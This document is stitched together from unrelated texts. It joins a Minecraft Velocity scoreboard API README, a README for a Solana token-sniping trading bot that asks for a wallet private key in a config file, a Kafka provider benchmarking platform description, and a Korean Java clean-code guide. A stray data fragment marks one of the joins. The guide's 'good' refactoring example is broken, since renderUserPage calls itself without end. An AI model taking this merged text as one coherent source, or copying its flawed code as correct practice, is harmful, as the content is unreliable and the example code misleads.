**VelocityScoreboardAPI** is an API plugin by NEZNAMY ([TAB](https://github.com/NEZNAMY/TAB)), William278 ([Velocitab](https://github.com/WiIIiam278/Velocitab)) and AlexDev_  ([Velocitab](https://github.com/WiIIiam278/Velocitab)), providing Velocity proxy servers with an API for interfacing with Scoreboard. This allows developers a standard way of performing scoreboard/team operations in lieu of an API provided by Velocity. This plugin does not provide any features on its own.

## Server owners
Please add the plugin to your Velocity server's plugins folder. Make sure you are running the latest version of Velocity (check the requirements below).

### Requirements
* Java 17+
* Velocity 3.3.0 (latest build)

## Developers
VelocityScoreboardAPI is available [on Maven](https://repo.william278.net/#/releases/net/william278/velocityscoreboardapi/). You can browse the Javadocs [here](https://repo.william278.net/javadoc/releases/net/william278/velocityscoreboardapi/latest).

First, add the Maven repository to your `build.gradle` file:
```groovy
repositories {
    maven { url ""https://repo.william278.net/releases"" }
    // maven { url ""https://repo.william278.net/snapshots"" } // For snapshot builds
}
```

Then, add the dependency itself. Replace `VERSION` with the latest version. (e.g., `1.0`)

```groovy
dependencies {
    implementation ""net.william278:velocityscoreboardapi:VERSION""
}
```

Using Maven/something else? There's instructions on how to include VelocityScoreboardAPI on [the repo browser](https://repo.william278.net/#/releases/net/william278/velocityscoreboardapi).

## Config
A configuration file is provided for the plugin. The configuration file is located at `plugins/velocity-scoreboard-api/config.yml`. The configuration file is automatically generated when the plugin is loaded for the first time. The configuration file contains the following options:

```yaml
# Whether scoreboard API events should be fired
call_scoreboard_events: true
# Whether to log invalid packets received from downstream servers
print_invalid_downstream_packet_warnings: true
```

## Detailed overview of the plugin
* **Proxy vs backend scoreboard** - Every player has 2 scoreboards.
  * **Backend scoreboard** - A read-only tracker of objectives and teams coming from backend server (also used internally for proper compatibility).
  * **Proxy scoreboard** - Scoreboard fully editable using the API. All teams (and their entries) and objectives will take priority over backend scoreboard. Every player has their own proxy scoreboard instance.
* **Event system** - Events called every time an objective or team is registered, unregistered or player is added/removed from a team. Can be disabled in config.
* **Consumers for updating properties** - In order to allow performing multiple changes at once with a single packet instead of sending update packet for each individual change, all updates support methods using Consumer<?>. Unlike with an all-arg method, this offers great compatibility in case something is added in future MC versions without having to explicitly support plugins using old method.
* **High performance** - Tested on a huge server with 1500+ players using spark, the plugin has reached perfect performance. Some code is slightly complex because of this, however, simplifying code at the cost of worse performance can be done any time if decided without having to worry about performance.
* **Invalid packet cancellation** - Invalid backend packets are cancelled or fixed to prevent warnings/errors/disconnects in the client when an invalid backend packet is received.
* **Custom TextHolder class** - For allowing to configure both legacy texts and modern components, custom class `TextHolder` is used as value, allowing users to explicitly define per-version values without having to check for client version (if one of the two values is not specified, it will be calculated)",6,1,1,apache-2.0,1.0

## Overview
A fast and efficient bot written in NodeJS to automatically buy and sell tokens on the blockchain as soon as liquidity is added and trade is enabled.

The bot is extremely fast as long as you use a good node and not a public one. With a node from Quicknode you can expect a buy/sell transaction in less than 5 seconds.

The bot uploaded on github is the lite version of the real bot. You do not get all of the features from the premium version.




- `Auto-Sell`
- `TP/SL`
- `Min Liq`
- `Burn/Lock Check`
- `Renounce Check`
- `Fast Buy`

## SETUP
To run the script you need to:
1. Install the Node.js environment on your computer : https://nodejs.org/en
2. The runtime environment should be a terminal or VSCode. Detailed steps are provided below, please read carefully.
3. Convert some SOL into WSOL for trading. Note: Even if you only want to run the test for one hour, you still need to retain enough SOL, as gas fees are paid in SOL. For example (10 SOL) : (1 WSOL) : (QUOTE_AMOUNT=0.1) +-

## CONFIG
1. Configure the script by updating `.env.copy` file (**remove the .copy from the file name when done**).
2. `PRIVATE_KEY` (your wallet private key)
3. `RPC_ENDPOINT` (https RPC endpoint) 
4. `RPC_WEBSOCKET_ENDPOINT` (websocket RPC endpoint)
5. `QUOTE_MINT` (Use WSOL by default)
6. `QUOTE_AMOUNT` (amount used to buy each new token)
7. `COMMITMENT_LEVEL` (No modification required)
8. `CHECK_IF_IS_BURNED` (liquidity burn check)
9. `CHECK_IF_IS_LOCKED` (liquidity lock check)
10. `USE_SNIPE_LIST` (buy only tokens listed in snipe-list.txt)
11. `SNIPE_LIST_REFRESH_INTERVAL` (how often snipe list should be refreshed in milliseconds)
12. `CHECK_IF_MINT_IS_RENOUNCED` (script will buy only if mint is renounced)
13. `MIN_POOL_SIZE` (script will buy only if pool size is greater than specified amount)
14. `TAKE_PROFIT=50` (in %)
15. `STOP_LOSS=30` (in %)
16. `BIRDEYE_API_KEY=` (TP/SL, Burn/Lock) You can use the default link in the .env file, it works fine and does not need to be changed. Go here if you want to generate it yourself : https://docs.birdeye.so/docs/authentication-api-keys

![](readme/env.png)
  
## INSTALL
1. Install dependencies by typing: `npm install`
2. Run the script by typing: `npm run start` in terminal

![](readme/preview.png)

## TAKE PROFIT

> [!NOTE]
> By default, 50 % 

## STOP LOSS

> [!NOTE]
> By default, 30 %

## AUTO SELL
By default, auto sell is enabled. If you want to disable it, you need to:
1. Change variable `AUTO_SELL` to `false`
2. Update `MAX_SELL_RETRIES` to set the maximum number of retries for selling token
3. Update `AUTO_SELL_DELAY` to the number of milliseconds you want to wait before selling the token (this will sell the token after the specified delay. (+- RPC node speed)).

If you set AUTO_SELL_DELAY to 0, token will be sold immediately after it is bought.
There is no guarantee that the token will be sold at a profit or even sold at all. The developer is not responsible for any losses incurred by using this feature.

![](readme/token.png)

## SNIPE LIST
By default, script buys each token which has a new liquidity pool created and open for trading.
There are scenarios when you want to buy one specific token as soon as possible during the launch event.
To achieve this, you'll have to use snipe list.
1. Change variable `USE_SNIPE_LIST` to `true` 
2. Add token mint addresses you wish to buy in `snipe-list.txt` file (add each address as a new line).

This will prevent script from buying everything, and instead it will buy just listed tokens.
You can update the list while script is running. Script will check for new values in specified interval (`SNIPE_LIST_REFRESH_INTERVAL`).

Pool must not exist before the script starts.
It will buy only when new pool is open for trading. If you want to buy token that will be launched in the future, make sure that script is running before the launch.

## COMMON ISSUES

> [!IMPORTANT]
> If you have an error which is not listed here, please create a new issue in this repository.
> To collect more information on an issue, please change `LOG_LEVEL` to `debug`.
> 
> ### EMPTY TRANSACTION
> If you see empty transactions on SolScan most likely fix is to change commitment level to `finalized`.
> 
> ### UNSOPPORTED RPC NODE
> If you see following error in your log file:  
> `Error: 410 Gone:  {""jsonrpc"":""2.0"",""error"":{""code"": 410, ""message"":""The RPC call or parameters have been disabled.""}, ""id"": ""986f3599-b2b7-47c4-b951-074c19842bad""}`  
> It means your RPC node doesn't support methods needed to execute script.
> FIX: Change your RPC node. You can use Shyft, Helius or Quicknode. 
> 
> ### NO TOKEN ACCOUNT
> If you see following error in your log file:  
> `Error: No SOL token account found in wallet:`  
> it means that wallet you provided doesn't have WSOL token account.
> FIX: Go to dex and swap some SOL to WSOL. When you swap sol to wsol you should see it in wallet.

## DISCLAIMER

> [!IMPORTANT]
> Use this script at your own risk.

## Kafka Provider Comparison

Kafka Provider Comparison (KPC) is a public Kafka comparison platform built on the code of the [OpenMessaging Benchmark](https://github.com/openmessaging/benchmark).

The Kafka API has become the de facto standard in the streaming domain. In recent years, many new streaming systems compatible with the Kafka API (hereinafter referred to as Kafka Providers) have emerged. The purpose of building this comparison platform is not to determine the best Kafka streaming system, but to provide a **fair**, **objective**, and **open** comparison environment to generate objective and fair Kafka streaming system comparison reports. The comparison reports will include multiple comparison dimensions, such as latency, cost, elasticity, throughput, and more. Different products have different design architectures and trade-offs, and naturally, they will perform differently in various comparison dimensions. This objective comparison result will be very helpful for users in making technical selections.

## Supported Kafka Providers

* [AutoMQ](https://www.automq.com)
* [Apache Kafka](https://kafka.apache.org)
* [Amazon MSK](https://docs.amazonaws.cn/msk/index.html)

## Comparison Platform Execution Logic

All execution logic of the comparison platform is encapsulated in GitHub Actions, and comparison tasks are triggered through GitHub Actions Workflow. The execution logic of the comparison tasks is as follows:

1. GitHub Actions meet the scheduled trigger conditions and trigger the Workflow execution.
2. The Benchmark processes of multiple Kafka Providers included in the Workflow will be executed in parallel.
3. Each Benchmark Provider process includes the following sequential sub-stages, executed in order. Different Kafka Providers will be evaluated simultaneously.
   1. Install: Initialize cloud resources on AWS according to the Terraform configuration file, check out the code, install dependencies, and then use the Ansible playbook to install the Kafka Provider. This stage will also calculate the cost based on the Terraform configuration file, as part of the final Comparison Report.
   2. Benchmark: This stage depends on the Install stage and will be triggered after its completion. This stage mainly uses the information from the Terraform Output to remotely log in to the cloud Client machine and execute the OpenMessaging Benchmark test.
   3. Generate Report: The Benchmark result files executed on the cloud Client will be copied to the GitHub Runner machine, the content will be parsed to generate the final Report content, and displayed in [issue-1](https://github.com/AutoMQ/kafka-provider-comparison/issues/1)
   4. Uninstall: This stage depends on the Benchmark stage and will be triggered after its completion. This stage will clean up cloud resources, including deleting the cloud Client machine and the Kafka Provider cluster on the cloud.

## Benchmark Report Description

A complete Benchmark Report will include the following content:
- Report Generated: The generation time of the Report. Based on this generation time, you can see the specific Workflow execution details from the GitHub Actions of the open-source repository, including how the cost is calculated, the Benchmark output logs, etc.
- Workload Configuration: The Workload configuration information extracted from the OpenMessaging Benchmark run logs. To ensure the fairness of the comparison, we will use the exact same Workload, Producer, and Consumer configuration for all Kafka Providers.
- Producer Configuration: Producer configuration, the Producer configuration of all Kafka Providers is the same.
- Consumer Configuration: Consumer configuration, the Consumer configuration of all Kafka Providers is the same.
- Topic Configuration: Topic configuration, the Topic configuration of all Kafka Providers is the same.
- Replication Factor: Replication factor, the replication factor of all Kafka Providers is the same.
- Average Throughput: The average throughput during the entire Benchmark process, in MB/s.
- Pub Latency (ms) avg: The average publish latency during the entire Benchmark process, in ms.
- Pub Latency (ms) P99: The P99 publish latency during the entire Benchmark process, in ms.
- E2E LatencyAvg(ms): The average end-to-end latency during the entire Benchmark process, in ms.
- E2E P95 Latency(ms): The P95 end-to-end latency during the entire Benchmark process, in ms.
- E2E P99 Latency(ms): The P99 end-to-end latency during the entire Benchmark process, in ms.
- Baseline Cost: The baseline cost of the Kafka Provider (excluding the usage cost of IaaS cloud services), in USD. Based on [Infracost](https://www.infracost.io/), the cost is calculated by analyzing the Terraform configuration file.
- Usage Cost: The cloud resource usage cost of the Kafka Provider, in USD. Based on [Infracost](https://www.infracost.io/), the cost is calculated by analyzing the Terraform configuration file and usage configuration. The usage is calculated based on the infracost usage in the `infracost` directory. For example, for AutoMQ, we calculate the cost based on the average write throughput of 10MB/s, with 31.25 PUTs and 12.5 GETs per GB of write throughput. The cost estimation logic will be explained in detail in the following chapters.
- Total Cost: The total cost of the Kafka Provider, in USD. The value is equal to the baseline cost plus the usage cost.

## How to Contribute

Assuming your Kafka provider is named `foo`, you will create the following content to include `foo` in the comparison list:
Create a `driver-foo` module in the root directory, and the `/deploy/aws-cn` directory of this module must include the following key files:
- var.tfvars: By default, to ensure the fixed workload and production/consumption mode, we only open the following values for customization. If these configurations are not suitable for your Kafka Provider, you can submit a new PR and explain which new values need to be opened and the reasons.
- deploy.yaml: The Ansible playbook configuration file for deploying the specific Kafka Provider.
- cost_explanation.md: A document explaining how the cost is calculated. Different Kafka Providers have different implementations, leading to significant differences in the usage of some computing and storage services. To ensure fairness and openness, please provide a detailed explanation of the cost usage calculation logic. This part of the explanation can refer to the files in the `cost-explanation` directory of the project.
- infracost usage config yaml: In the root directory of infracost, we provide a default `template-medium-500m` template file, which is also the default usage configuration file for infracost medium scale. You can modify this file according to the actual situation of your Kafka Provider to more accurately calculate the usage cost. And publicly explain these modifications in `cost-explanation/foo.md`.

After completing the above steps, you need to add a new job in the three files under `.github/workflows` following the pattern of other Kafka Providers to ensure that the Workflow can execute the Benchmark process of your Kafka Provider when it runs on a schedule. If you have any questions about how to contribute, feel free to submit an issue under this project or join our [Slack](https://join.slack.com/t/automq/shared_invite/zt-29h17vye9-thf31ebIVL9oXuRdACnOIA) channel for discussion.

You can fork our code and test it locally. When you are satisfied with the test, you can submit a PR to our repository. We will review and merge your PR after receiving it. After merging, we will check the accuracy of your code execution in our workflow. If there are any issues, we will provide feedback on the PR and temporarily disable the execution and comparison of your Kafka Provider in the workflow (for new Kafka providers) or revert to the previous version.

> Tips: Currently, only comparisons in the cn-northwest-1 region of AWS China are supported. More cloud providers and regions will be supported in the future. The test allows users to use different numbers and specifications of machines. Using higher machine specifications will improve performance but also increase costs.

### How to Contribute a Non-Open-Source Kafka Provider

KPC also supports comparisons of non-open-source Kafka Providers. If your Kafka Provider is not open-source, you can provide a basic image that is encrypted or obfuscated to contribute a new Kafka Provider for deployment and testing in our environment. For Kafka Providers that are not open-source and do not provide images, such as Confluent/Aiven, we will use the Terraform provider they provide for deployment.

### Fixed Workload Configuration

To ensure the fairness of the comparison, we have fixed a representative Workload, Producer, and Consumer configuration [tail-read-100m.yaml](workloads/vs/fast-tail-read-100m.yaml). This configuration supports generating a theoretical peak write throughput of 100 MB/s.

### Cost Estimation

#### Challenges and Solutions of Cost Estimation

The cost of fixed-scale cloud services can be clearly calculated. The challenge of cost estimation lies in the estimation of cloud service usage. Cloud services measure and charge for different services based on usage, such as API calls and storage space for S3. Different products have different implementations, making usage cost estimation very challenging. To ensure accurate and fair estimation, we will provide a markdown file named after the Kafka provider in the driver directory of each Kafka Provider to explain how the cost is calculated. Different Kafka Providers have different implementations, leading to significant differences in the usage of some computing and storage services. To ensure fairness and openness, we will ensure that all Kafka providers provide detailed cost calculation logic for computing and storage costs. The following are the cost estimation explanations for different Kafka Providers:

- [AutoMQ](cost-explanation/automq.md)
- [Apache Kafka](cost-explanation/kafka.md)
- [Apache MSK](cost-explanation/msk.md)

### Dependent Action Secrets

- AUTOMQ_ACCESS_KEY: AWS Access Key
- AUTOMQ_SECRET_KEY: AWS Secret Key
- INFRA_COST_API_KEY: Infracost API Key. Can be obtained from [Infracost](https://www.infracost.io/)
- SSH_PRIVATE_KEY: SSH Private Key, directly fixed in secrets
- SSH_PUBLIC_KEY: SSH Public Key, directly fixed in secrets
- TF_BACKEND_BUCKET: S3 Bucket for storing Terraform State
- TF_BACKEND_KEY: S3 Key for storing Terraform State

## Comparison Report Generation Cycle

We plan to trigger the workflow to generate a comparison report every Monday at 8 AM.

## Roadmap

- Add horizontal automated comparisons for Kafka Providers such as Confluent/Aiven/Redpanda/WarpStream/Pulsar
- Support comparison of elasticity, i.e., how long it takes for the Client to recover from scaling actions
- Add tests related to Kafka compatibility.
- More visually appealing and readable comparative reports.

# 코딩 가이드 개요 
<aside>
💡 개요

팀 내 코드리뷰를 위한 가이드를 만들어서 네이밍, 코드 준수 사항의 의사결정 횟수를 줄이고 단순하고 유연한 통일감 있는 코드를 지향함으로써 보다 효율적인 팀 코드 문서를 생산한다.


- 새로 합류한 멤버도 팀의 가이드 라인을 준수할 수 있도록, 코딩 가이드 + 코드 리뷰 가이드를 작성한다.
- 코드의 네이밍만으로도 기능을 알수 있도록 작성한다. 
- 코딩 가이드 + 코드 리뷰 가이드는 팀내 개발 문화로써 엄격한 준수를 지향한다.
- 툴의 통일성, 단축키의 기본 설정화를 지향하여 코드 리뷰시 단축기 사용등의 팁 또한 공유 되어야 한다.
- 단순히 코드의 품질만 논의 하는게 아니라 버그나 방어 코드 필요 여부, 관행적 명명을 준수 하였는지 (by 코딩 가이드), 사이드 이펙트는 없는지 고민해서 리뷰하고 항상 본 문서 이외의 방식에서 주장하는 바는 근거자료를 찾아 보충하도록 한다.
- 개선이 필요하다면 왜 개선해야 하는가? 에 대해서 충분히 설명이 필요하다. 설명이 없다면 결국 코드에 트집을 잡겠다는 것 밖에 되지 않으므로 제안과 이유에 대해서 상세히 설명한다.

## 클래스와 객체, 객체와 인스턴스

클래스 : 객체를 생성하기 위한 설계 코드로 아래와 같은 형태를 가지고 있다.

- 생성자
- 속성
- 메서드

구체적인 값을 가진 상태라기 보다는 추상적인 개념

객체 : 클래스를 통해 만들어진 구체적인 개체. 클래스에서 정의된 속성과 메서드를 가지고 데이터를 지닌 상태로 메서드를 호출하고 동작을 수행한다. 클래스에 정의된 메서드를 통해 객체의 속성과 행동을 이용하여 실제 프로그램에서 사용된다.  

클래스 : 클래스는 건축물의 설계도와 같은 개념이고 객체는 설계도를 기반으로 만들어진 집과 같다. <br>
클래스는 데이터와 그 데이터를 처리하는 메서드의 집합으로 이루어져 있다. <br>
집이라는 클래스를 보면 방의 수, 크기, 화장실의 수, 외관의 색깔 등의 데이터를 가지고 집으로서의 필수적인 기능들을 수행하는 메서드를 가지고 있다.<br>

인스턴스 : 인스턴스는 특정 클래스를 통해 실제로 메모리에 생성된 객체로 저마다 고유한 값(참조값)을 지니고 있다.

객체가 [집]이라고 하는 일반적인 개념이라면 인스턴스는 집 객체를 참조하는 [우리집, 영희네 집, 철수네 집] 이라고 생각할 수 있다. <br>
각각의 집은 서로 다른 속성을 가질수 있지만 모두 집 클래스의 특성과 기능을 공유할 수 있다.
따라서 클래스와 객체는 1:N의 관계를 가지고, 객체와 인스턴스는 1:N의 관계를 가진다.

객체는 런타임(실행 시)에 메모리에 할당되는 반면, 클래스는 컴파일 시 메모리에 로드된다.

## 메서드와 함수

메서드는 특정 클래스에 속하며, 객체의 속성이나 행동을 정의하는 코드를 의미한다.

객체를 통해서만 호출할 수 있으며 객체간의 상호작용과 데이터 은닉을 구현한다.

함수는 좀 더 범용적인 개념으로 독립적으로 존재하며 특정 작업이나 기능을 수행하여 값을 반환하는, 자바 이외의 다른 프로그래밍에서도 사용되는 개념이다.

개념적으로 함수는 메서드보다 상위의 개념이지만, 주로 자바 진영에서는 초기부터 메서드라는 명명법이 익숙하기 때문에 함수 = 메서드 라고 표현을 할 것이다.

## 나쁜 코드

나쁜 코드가 쌓일 수록 팀 생산성은 떨어진다.

최대한 빠른 개발을 추구하는 가장 간단한 길은 최대한 코드를 클린하게 유지하는 것이다.

그러기 위한 몇가지 원칙은 아래와 같다. 

- 중복을 피하라.
- 한기능만 수행하라
- 제대로 표현하라
- 작게 추상화하라.

## 좋은 코드를 작성하는 몇가지 규칙들

1. 보이스카우트 규칙 : 캠프장은 처음 왔을 때보다 더 깨끗하게 해놓고 떠나라.
- 변수 이름을 명확히 하고
- 조금 긴 메서드는 분할하고
- 약간의 중복을 제거하고
- 복잡한 if 문 하나를 정리하고…
2. 객체 지향 설계의 다섯가지 원칙
- SRP(Single Responsibility Principle) : 클래스에는 한 가지 변경 이유만 존재해야 한다.
- OCP(Open Closed Principle) : 클래스는 확장에 열려 있어야 하며 변경에 닫혀 있어야 한다.
- LSP(Liskov Substitution Principle) : 상속받은 클래스는 기초 클래스를 대체할 수 있어야 한다.
- DIP(Dependency Inversion Principle) : 추상화는 의존해야 하며, 구체화는 의존하면 안된다.
- ISP(Interface Segregation Principle) : 클라이언트가 필요로 하는 기능만을 제공한다. (불필요한 기능들을 분리하여 인터페이스를 작게 유지해야 한다)

# 의미 있는 이름

의도를 분명히 밝혀야 한다.

```java
// 의미 없는 함수 이름
public void processData(Object data) {
  // ...
} // bad

// 의미 있는 함수 이름
public void calculateStudentGrade(List<Student> students) {
  // ...
} // good 
```

조건의 경우 다음과 같은 코드가 더 명확히 읽힌다.

조건문 분리 코드

```java
// 중첩 if 문 
if (user.isLogIn()) {
  if (user.isAdmin()) {
    // 관리자 페이지 표시
  } else {
    // 일반 사용자 페이지 표시
  }
} else {
  // 로그인 페이지 표시
} // bad 
```

```java
// 조건문 분리 및 함수 사용
if (user.isLogIn()) {
  renderUserPage(user);
} else {
  renderLoginPage();
} 

private void renderUserPage(User user) {
  if (user.isAdmin()) {
    renderAdminPage(user);
  } else {
    renderUserPage(user);
  }
} 

private void renderLoginPage() {
  // 로그인 페이지 표시
} // good 
```

조건부 표현식 사용

```java
// if 문 사용
if (user.getAge() >= 19) {
  // 성인임을 알리는 메시지 출력
} else {
  // 미성년임을 알리는 메시지 출력
} // bad 
```

```java
boolean isAdult = user.getAge() >= 19;

if (isAdult) {
  // 성인임을 알리는 메시지 출력
} else {
  // 미성년임을 알리는 메시지 출력
} // good 
```

### 1. 그릇된 정보를 피해라.

영문자 O와 숫자 0 과 같이 구분이 어려운 조합을 정보로 제공하지 않아야 한다.

유사한 개념은 유사한 표기법을 사용해야 하지만(일관성) 다른 개념과 혼용될 수 있는 정보를 제공해서는 안된다.

### 2. 의미있게 구분하라.

문자열을 카피할 때 파라미터로 (char a1[], char a2[]) 보다는  (char source[], char destination[]) 이 훨씬 읽기 편하다.

### 3. 검색하기 쉬운 이름, 발음하기 쉬운 이름을 사용하라.

### 4. 클래스 이름 규칙 

클래스 이름과 객체 이름은 명사나 명사구가 적합하다.

ex)Customer, Account 등 (info, data, manager 등은 피한다)

### 5. 메서드 이름 규칙 

동사나 동사구가 적합하다.

ex) registerUser, deletePage

### 6. 한 개념에 한 단어를 사용하라.

ex) fetch, get, retrieve등과 같이 한가지 기능을 하는 여러 표기나 여러 단어는 피하라.

# 함수 (메서드)

> - 함수는 작게 만들어야 한다.
> - 한가지만 수행해야 한다.
> - 함수당 하나의 추상화 수준을 유지한다.
> - 위에서 아래로 코드 읽기 : 내려가기 규칙, 위에서 부터 아래로 코드가 이동되어야 한다. 
>   - 개인적인 의견이지만 한 메서드에 다른 메서드들이 존재한다면 먼저 읽히는 메서드가 바로 밑에 존재하는게 읽기 편하다.
> 

### 1. switch 문

switch 문은 기본적인 분기 문법이 길어 작게 만들기 어렵다. <br> 또한 기능상으로 여러개의 조건에 맞는 처리를 하기 때문에 
한가지 기능을 수행하지 못하므로, 이를 저차원 클래스로 숨기고 변경되는 요인에 따른 영향도를 최소화 해야 한다.

아래의 예제를 살펴보자. 각 근무형태에 따른 급여를 계산하는 로직이다. 

```java

/**
 * @author CodeVillains
 * @description 직관적으로 switch 조건식을 통해 작성한 급여 계산 로직.   
 * 장점 : switch 구문을 이용해서 로직을 직관적으로 이해할 수 있다. 단순한 로직의 경우 직접 구현하는 형태로 초보자용 코드로 적합하다. 
 * 단점 : 코드 중복 - switch 문 내의 각 사례가 서로 다른 계산을 처리하여 중복이 발생하므로 일정 수준의 코드 중복이 발생한다. 
 * OCP 위반 - 직원 유형이 추가된다거나 급여 계산식이 바뀔 경우 스위치 구문내부가 급격하게 늘어나고 각각의 코드 로직이 복잡해져 유지관리가 어렵다.(개방폐쇄 원칙 위반)
 */
public class EmployeePaySwitch {
    
    public static void main(String[] args) {
        String employeeType = ""Contract""; // 직원 유형 설정
        double hoursWorked = 40; // 근무 시간
        double hourlyRate = 15000; // 시간당 급여

        double pay = calculatePay(employeeType, hoursWorked, hourlyRate);
        System.out.println(""직원 유형: "" + employeeType);
        System.out.println(""근무 시간: "" + hoursWorked + ""시간"");
        System.out.println(""시간당 급여: "" + hourlyRate + ""원"");
        System.out.println(""총 급여: "" + pay + ""원"");
    }

    public static double calculatePay(String employeeType, double hoursWorked, double hourlyRate) {
        double pay = 0;

        switch (employeeType) {
            case ""Regular"":
                pay = hoursWorked * hourlyRate + 50000; // 정규직 추가 급여
                break;
            case ""Contract"":
                pay = hoursWorked * hourlyRate;
                break;
            case ""Temporary"":
                pay = hoursWorked * hourlyRate * 0.8; // 임시직 급여율
                break;
            case ""Asist"":
                pay = hoursWorked * hourlyRate * 0.7; // 어시스트 급여율
                break;
            default:
                System.out.println(""유효하지 않은 직원 유형입니다."");
        }
        return pay;
    }
}
```

대부분의 경우 이 코드에서 좀 더 개선해보자면 아래와 같은 형태로 작성할 것이다.

``` java 
public class EmployeePaySwitchRefactor {

    public static void main(String[] args) {
        String employeeType = ""Contract""; // 직원 유형 설정
        double hoursWorked = 40; // 근무 시간
        double hourlyRate = 15000; // 시간당 급여

        double pay = calculatePay(employeeType, hoursWorked, hourlyRate);
        System.out.println(""직원 유형: "" + employeeType);
        System.out.println(""근무 시간: "" + hoursWorked + ""시간"");
        System.out.println(""시간당 급여: "" + hourlyRate + ""원"");
        System.out.println(""총 급여: "" + pay + ""원"");
    }

    public static double calculatePay(String employeeType, double hoursWorked, double hourlyRate) {
        double pay = 0;

        switch (employeeType) {
            case ""Regular"":
                pay = calculatePayWithAdjustment(hoursWorked, hourlyRate, 1.0); // 정규직 추가 급여
                break;
            case ""Contract"":
                pay = calculatePayWithAdjustment(hoursWorked, hourlyRate, 1.0);
                break;
            case ""Temporary"":
                pay = calculatePayWithAdjustment(hoursWorked, hourlyRate, 0.8); // 임시직 급여율
                break;
            case ""Assist"":
                pay = calculatePayWithAdjustment(hoursWorked, hourlyRate, 0.7); // 어시스트 급여율
                break;
            default:
                System.out.println(""유효하지 않은 직원 유형입니다."");
        }

        return pay;
    }

    private static double calculatePayWithAdjustment(double hoursWorked, double hourlyRate, double adjustment) {
        return hoursWorked * hourlyRate * adjustment;
    }
}
```

switch 구문 내에서 로직이 들어가는 부분을 공통 메서드로 분리하였다.

장점으로는 공통 급여 계산 로직을 별도의 메서드로 추출하면 중복이 줄어들고 코드 재사용성이 좋아졌다는 것과 
각 계산 로직이 메서드 호출 형태로 변경 되어 가독성 및 변경 영향도가 줄어들어 유지보수가 더 쉽다는 것을 들 수 있다.
<br>그러나 아직 switch 문에 로직이 존재하여 근무 형태애 따른 정책이 변경되면 내부 로직에 수정이 필요할 수 있고(OCP) switch 문이 주요 흐름이므로 메서드가 추가 된다거나 하는 등의 확장성에는 완전히 유용해보이지 않는다.

따라서 이러한 switch 구문을 어딘가로 위임하거나 상속 관계로 숨겨 실제 로직을 파생 클래스의 메서드를 호출하는 방식으로 변경하는게 더 OOP에 적합하다.

여기서 공통 기능을 수행하는 급여 계산은 구현하는 모든 근무형태 클래스에서 각각의 로직을 가져야 하므로 인터페이스로 정의한다.

```java
/**
 * 급여 계산에 대한 공통 인터페이스 정의
 */
public interface PayCalculator {
    double calculatePay(double hoursWorked, double hourlyRate);
}
```

정규직인 경우 급여 계산식에서 + 50000이 추가되므로 아래와 같은 계산식이 된다. 
```java
public class RegularPayCalculator implements PayCalculator {

    @Override
    public double calculatePay(double hoursWorked, double hourlyRate) {
        return hoursWorked * hourlyRate + 50000;
    }
}
```

계약직과 임시직, 어시스트 계산식도 각각 구현해준다. 
```java
// 계약직 
public class ContractPayCalculator implements PayCalculator {
    @Override
    public double calculatePay(double hoursWorked, double hourlyRate) {
        return hoursWorked * hourlyRate;
    }
}

```

```java
// 임시직 
public class TemporaryPayCalculator implements PayCalculator {
   @Override
   public double calculatePay(double hoursWorked, double hourlyRate) {
      return hoursWorked * hourlyRate * 0.8; // Temporary employe
   }
}
```


```java
// 어시스트 
class AssistPayCalculator implements PayCalculator {
    @Override
    public double calculatePay(double hoursWorked, double hourlyRate) {
        return hoursWorked * hourlyRate * 0.7; // Assist employee
    }
}
```

여기까지가 구체적인 급여 계산 클래스들이다. 이제 이를 호출하는 클라이언트(메인 코드)와 인스턴스를 생성하는 코드를 살펴보자.  

```java
public class PayCalculatorFactory {

    static PayCalculator createPayCalculator(String employeeType) {
        switch (employeeType) {
            case ""Regular"":
                return new RegularPayCalculator();
            case ""Contract"":
                return new ContractPayCalculator();
            case ""Temporary"":
                return new TemporaryPayCalculator();
            case ""Assist"":
                return new AssistPayCalculator();
            default:
                return null;
        }
    }
}

```
createPayCalculator 메서드를 통해 적절한 급여 계산 인스턴스를 생성해온다. 그 결과에 따라 switch 구문에 따른 직원 유형의 계산 결과를 반환한다. 


```java
public class EmployeePayAbstractFatoryMain {

    public static void main(String[] args) {
        String employeeType = ""Contract""; // Employee type setting
        double hoursWorked = 40; // Hours worked
        double hourlyRate = 15000; // Hourly rate

        PayCalculator payCalculator = PayCalculatorFactory.createPayCalculator(employeeType);
        if (payCalculator != null) {
            double pay = payCalculator.calculatePay(hoursWorked, hourlyRate);
            System.out.println(""Employee type: "" + employeeType);
            System.out.println(""Hours worked: "" + hoursWorked + "" hours"");
            System.out.println(""Hourly rate: "" + hourlyRate + "" won"");
            System.out.println(""Total pay: "" + pay + "" won"");
        } else {
            System.out.println(""Invalid employee type."");
        }
    }
}
```
실제 호출 부분은 switch 구문이 보이지 않고 팩토리를 통해 생성한 직원 유형에 따른 계산식을 호출 한 뒤 결과값만을 출력(return) 해주는 역할이 끝이다. 


이 코드는 각 직원 유형에 대한 급여 계산을 모듈화하고, 추가적인 직원 유형이 추가되거나 변경되더라도 수정을 최소화한다. 
물론 새로운 직원 유형을 추가해야 하는 경우 여전히 스위치 문 내에서 새로운 케이스를 처리해주어야 하기 때문에 OCP를 완전히 구현한 것은 아니다.

그러나 원본 코드와 비교한다면 더 유지보수 하기 쉽고 기능별 모듈화를 통해 객체 지향적인 코드의 방향에 맞게 설계가 가능하다는 것을 알수 있다.

만약 해당 코드에 switch 구문을 제거하고 전략 패턴으로 좀 더 완벽하게 분리하는 것을 추가 하고 싶다면 아래의 예제 코드들을 살펴보면 도움이 될 것이다.

>

> 
비슷한 구조로 리팩토링 되어있으므로 이해하기 어렵지 않을 것이다. 

### 2. 서술적인 이름을 사용하라. 
메서드가 하는 일을 좀  더 잘 표현할 수 있도록 서술형 이름을 지어야 한다. 

모듈 내에서 함수 이름은 일관성(같은 문구나 명사, 동사등의 사용 규칙)을 유지해야 한다. 

### 3. 메서드 인수 
이상적인 인수의 갯수는 '없으면 없을수록 좋다' 이다. 
인수를 주더라도 3개 이상은 지양하고, 4개 부터는 특별한 경우를 제외하고는 객체를 넘겨서 처리하는 것이 낫다.
또한 인수값으로 flag를 넘기다는 것은 메서드에서 여러개의 처리를 하겠다는 의미이므로 boolean 을 통해 내부에서 값을 조작하는 행위는 지양해야 한다.

### 4. 명령과 조회를 분리해라.

### 5. DRY (Don't Repaet Yourself) 

### 6. 주석은 코드로 대체할 수 있어야 한다. 
즉, 주석은 나쁜 코드를 보완하지 못한다.
>
> [Code as Docuementation](https://martinfowler.com/bliki/CodeAsDocumentation.html) by Martin fowler
> 
